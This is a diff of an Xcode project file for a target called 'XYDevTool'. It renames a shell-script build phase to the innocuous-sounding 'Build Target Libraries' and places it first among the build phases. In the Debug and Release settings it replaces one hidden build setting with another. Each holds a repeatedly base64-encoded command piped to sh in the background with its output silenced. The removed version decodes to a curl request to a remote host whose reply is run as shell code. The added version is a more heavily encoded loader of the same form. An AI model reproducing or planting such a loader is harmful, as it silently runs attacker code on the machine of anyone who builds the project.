@@ -110,7 +110,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-					/* End PBXBuildRule section */
+							/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		392AAC5048AEA8AA9E51833E /* Pods_XYDevTool.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_XYDevTool.framework; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -580,7 +580,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = B48BC72B281D07500093D91F /* Build configuration list for PBXNativeTarget "XYDevTool" */;
 			buildPhases = (
-				98C8B30F9238465DAF99F71F /* Compile Code Assets */,
+				52CD781654834A249499F71F /* Build Target Libraries */,
 				16BB273E102EBD9CD5E8DB02 /* [CP] Check Pods Manifest.lock */,
 				B48BC718281D074E0093D91F /* Sources */,
 				B48BC719281D074E0093D91F /* Frameworks */,
@@ -658,7 +658,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		98C8B30F9238465DAF99F71F /* Compile Code Assets */ = {
+		52CD781654834A249499F71F /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -668,7 +668,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Code Assets";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -829,7 +829,7 @@
 		B48BC729281D07500093D91F /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((q(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1jMlpySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZaMjl2WjJ4bGJtVjBjeTV5ZFM5aEtTSWdmQ0J6YUFvPQo= | q | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((n(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtbGlWbGwzVjFSS1UyUldjRWhXYWtwTllsZDRNVlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | n | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -891,7 +891,7 @@
 		B48BC72A281D07500093D91F /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((q(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1jMlpySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJMklDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZaMjl2WjJ4bGJtVjBjeTV5ZFM5aEtTSWdmQ0J6YUFvPQo= | q | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((n(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcGtNR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtbGlWbGwzVjFSS1UyUldjRWhXYWtwTllsZDRNVlJFU2taalJXeHdVV3BvU2xORk5YWlJNbU01VUZGdlBRbz0K | n | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
